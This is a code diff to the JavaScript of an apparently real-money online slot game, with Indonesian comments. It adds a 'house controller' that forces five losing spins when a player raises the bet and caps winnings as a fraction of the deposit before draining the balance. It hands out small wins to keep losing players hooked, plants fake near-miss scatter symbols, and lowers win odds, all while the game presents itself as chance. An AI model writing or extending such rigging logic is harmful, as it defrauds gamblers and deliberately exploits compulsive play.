@@ -25,6 +25,13 @@ let forceScatterNextSpin = false;
 let currentSpinMode = 'ZONK'; 
 const RTP_HOLD_TIME = 30 * 60 * 1000; 
 
+// ==========================================
+// 🌟 BANDAR CONTROLLER STATE 🌟
+// ==========================================
+let initialDeposit = 0; 
+let lastBetAmount = 0;
+let punishCounter = 0; // Menghitung berapa kali player harus dihukum (Zonk)
+
 onValue(ref(db, 'admin_settings'), (snapshot) => {
     if (snapshot.exists()) {
         let data = snapshot.val();
@@ -69,12 +76,19 @@ window.addEventListener('message', (event) => {
 
     if (event.data.action === 'UPDATE_BALANCE_UI') {
         currentBalance = event.data.balance;
-        balanceEl.innerText = formatRp(currentBalance);
+        
+        // Tetapkan deposit awal jika ini muat pertama, atau jika ada penambahan dana signifikan
+        if (initialDeposit === 0 || currentBalance > balance + 5000) {
+            initialDeposit = currentBalance;
+        }
+        balance = currentBalance;
+        balanceEl.innerText = formatRp(balance);
     }
 
     if (event.data.action === 'BET_APPROVED') {
-        currentBalance = event.data.newBalance;
-        balanceEl.innerText = formatRp(currentBalance);
+        balance = event.data.newBalance;
+        currentBalance = balance;
+        balanceEl.innerText = formatRp(balance);
         
         totalWinRound = 0; winEl.innerText = "0.00";
         currentMultiIndex = 0; updateMultiplierUI();  
@@ -134,6 +148,7 @@ imageUrls.forEach(url => {
 // ==========================================
 // 4. GLOBAL STATE & CONFIGURATIONS
 // ==========================================
+let balance = 0; // Dikontrol Iframe
 const betSteps = [200, 400, 1000, 2000, 5000, 10000, 20000, 50000];
 let currentBetIndex = 2;
 
@@ -253,12 +268,47 @@ function initGameUI() {
 // ==========================================
 // 6. KUNCI ANTI-RUNGKAD: CUSTOM FUNCTION POOL
 // ==========================================
+
+function analyzeBandarEconomy(betAmount) {
+    if (isFreeSpin || forceScatterNextSpin) return null; // Bebaskan jika mode khusus
+    
+    // Hukuman jika player barbar menaikkan bet tiba-tiba
+    if (lastBetAmount > 0 && betAmount > (lastBetAmount * 1.5)) {
+        punishCounter = 5; // Paksa 5 putaran ke depan ZONK
+    }
+    lastBetAmount = betAmount;
+
+    if (punishCounter > 0) {
+        punishCounter--;
+        return 'ZONK_HARD';
+    }
+
+    // Kalkulasi batas maksimal kemenangan berdasarkan deposit & RTP
+    let currentPnl = balance - initialDeposit;
+    let maxWinAllowed = 0;
+    
+    if (globalRTP <= 30) maxWinAllowed = initialDeposit * 0.25; // Mentok win 25% dari depo (20k -> 25k max)
+    else if (globalRTP <= 60) maxWinAllowed = initialDeposit * 0.8; // Mentok win 80% (20k -> 36k max)
+    else maxWinAllowed = initialDeposit * 2.5; // Kalo RTP gacor, bisa win 2.5x lipat
+
+    if (currentPnl >= maxWinAllowed) {
+        return 'ZONK_HARD'; // Kuras perlahan
+    }
+
+    // Efek PHP (Rollercoaster) -> Jika saldo minus 50%, kasih nafas dikit
+    if (currentPnl < -(initialDeposit * 0.5) && Math.random() < 0.4) {
+        return 'RECEH';
+    }
+
+    return null; // Biarkan berjalan normal sesuai RTP
+}
+
 function getSymbolFromPool(mode, col, excludeIds = []) {
+    // FILTER MUTLAK: Buang Wild dan Scatter dari array undian dasar
     let baseElements = symbols.map(s => s.id).filter(id => id !== 'wild' && id !== 'scatter');
     let pool = [];
     
     if (mode === 'GACOR') {
-        // HAPUS WILD DARI SINI BIAR GAK TURUN DARI LANGIT
         pool = ['fa', 'fa', 'zhong', 'purple', 'wan', 'dots5', 'bamboo5'];
     } else if (mode === 'RECEH') {
         pool = ['dots2', 'dots2', 'dots2', 'bamboo2', 'bamboo2', 'wan', 'purple'];
@@ -273,14 +323,15 @@ function getSymbolFromPool(mode, col, excludeIds = []) {
 
     let selectedId = pool[Math.floor(Math.random() * pool.length)];
     
-    // SAFEGUARD MUTLAK: Cegah wild atau scatter ke-pick acak
+    // SAFEGUARD MUTLAK: Sekali lagi pastikan Wild tidak bocor dari langit
     if (selectedId === 'wild' || selectedId === 'scatter') selectedId = 'dots2';
 
     let symObj = symbols.find(s => s.id === selectedId);
     let sym = { ...symObj, isGoldFrame: false };
     
-    let goldChance = (globalRTP / 100) * (isFreeSpin ? 0.15 : 0.05);
-    if (mode === 'GACOR') goldChance += 0.10;
+    // Peluang bingkai emas dikecilkan agar kaskade lebih natural dan tidak over-combo
+    let goldChance = (globalRTP / 100) * (isFreeSpin ? 0.12 : 0.03);
+    if (mode === 'GACOR') goldChance += 0.08;
     
     // Bingkai emas cuma ada di kolom 2, 3, 4
     if (col > 0 && col < 4 && Math.random() < goldChance) {
@@ -298,7 +349,7 @@ function startSpin() {
     document.getElementById('win-banner').classList.add('hidden');  
 
     if (!isFreeSpin) {  
-        potongSaldo(bet);
+        potongSaldo(bet); // Tunggu konfirmasi dari iframe parent
     } else {  
         freeSpinsLeft--; document.getElementById('fs-left-val').innerText = freeSpinsLeft;  
         totalWinRound = 0; winEl.innerText = formatRp(fsTotalWinAmount);  
@@ -310,6 +361,10 @@ function startSpin() {
 function executeRollPhase() {
     totalSpinCount++; processAutoRTP(); 
     let targetGridData = [[], [], [], [], []];
+    let bet = betSteps[currentBetIndex];
+    
+    // 🌟 INTERVENSI BANDAR 🌟
+    let enforcedMode = analyzeBandarEconomy(bet);
     let randRTP = Math.random() * 100;
     
     currentSpinMode = 'ZONK'; 
@@ -318,23 +373,30 @@ function executeRollPhase() {
     if (forceScatterNextSpin) {
         currentSpinMode = 'SCATTER'; forceScatterNextSpin = false; set(ref(db, 'admin_settings/force_scatter'), false); totalSpinCount = 0;
     } 
+    else if (enforcedMode === 'ZONK_HARD') {
+        currentSpinMode = 'ZONK';
+    }
     else {
         if (!isFreeSpin) {
-            if (globalRTP <= 30) scatterChance = (totalSpinCount > 400) ? 0.05 : 0;
-            else scatterChance = 0.05 + ((globalRTP / 100) * 0.35); 
+            if (globalRTP <= 30) scatterChance = (totalSpinCount > 400) ? 0.02 : 0;
+            else scatterChance = 0.02 + ((globalRTP / 100) * 0.25); 
             if (Math.random() * 100 < scatterChance) { currentSpinMode = 'SCATTER'; totalSpinCount = 0; }
         } else {
-            if (Math.random() * 100 < 0.8) currentSpinMode = 'SCATTER';
+            if (Math.random() * 100 < 0.5) currentSpinMode = 'SCATTER';
         }
         
         if (currentSpinMode !== 'SCATTER') {
-            let gacorChance = (globalRTP / 100) * 15; let recehChance = (globalRTP / 100) * 40; 
-            if (randRTP < gacorChance) currentSpinMode = 'GACOR';   
+            let gacorChance = (globalRTP / 100) * 12; let recehChance = (globalRTP / 100) * 35; 
+            
+            if (enforcedMode) currentSpinMode = enforcedMode; // Timpa dengan mode PHP/Receh
+            else if (randRTP < gacorChance) currentSpinMode = 'GACOR';   
             else if (randRTP < gacorChance + recehChance) currentSpinMode = 'RECEH';   
-            if (isFreeSpin && currentSpinMode === 'ZONK' && Math.random() < 0.3) currentSpinMode = 'RECEH';
+            
+            if (isFreeSpin && currentSpinMode === 'ZONK' && Math.random() < 0.4) currentSpinMode = 'RECEH';
         }
     }
 
+    // Bangun Grid
     for (let col = 0; col < 5; col++) {
         let excludeArr = [];
         if (currentSpinMode === 'ZONK' && col === 1) excludeArr = targetGridData[0].map(s => s.id);
@@ -343,6 +405,7 @@ function executeRollPhase() {
         }
     }
 
+    // Tanam Scatter Paksa
     if (currentSpinMode === 'SCATTER') {
         let numScatters = Math.random() < 0.1 ? 4 : 3;
         let scatterCols = [0, 1, 2, 3, 4].sort(() => 0.5 - Math.random()).slice(0, numScatters);
@@ -352,6 +415,7 @@ function executeRollPhase() {
         });
     }
 
+    // Scatter PHP
     if (!isFreeSpin && currentSpinMode !== 'SCATTER' && Math.random() < 0.60) { 
         let numFake = Math.random() < 0.4 ? 2 : 1; 
         let colsToFake = [0, 1, 2, 3, 4].sort(() => 0.5 - Math.random()).slice(0, numFake);
@@ -421,7 +485,7 @@ function executeRollPhase() {
 }
 
 // ==========================================
-// 7. EVALUASI MENANG & CASCADE MULUS
+// 7. EVALUASI MENANG & KASKADE PELIT (ANTI-RUNGKAD)
 // ==========================================
 function evaluateWinningWays() {
     let baseWinCash = 0; let winningTilesSet = new Set(); let firstReelSyms = new Set();
@@ -466,8 +530,11 @@ function triggerDestruction(winningTilesSet, baseWinCash) {
     let banner = document.getElementById('win-banner');  
     banner.classList.remove('hidden');  
 
-    // DOWNGRADE MODE SAAT CASCADE BIAR BANDAR GAK RUNGKAD
-    let cascadeMode = currentSpinMode === 'GACOR' ? 'RECEH' : 'ZONK';
+    // 🌟 KASKADE PELIT (PEMUTUS KOMBO) 🌟
+    // Ketika terjadi runtuhan, pastikan simbol yang nyusul dari atas sengaja diset jadi Zonk
+    // agar kombo tidak berlanjut tanpa akhir.
+    let cascadeMode = 'ZONK'; 
+    if (currentSpinMode === 'GACOR' && Math.random() < 0.4) cascadeMode = 'RECEH'; 
 
     for (let col = 0; col < 5; col++) {  
         let remainingTiles = [];  
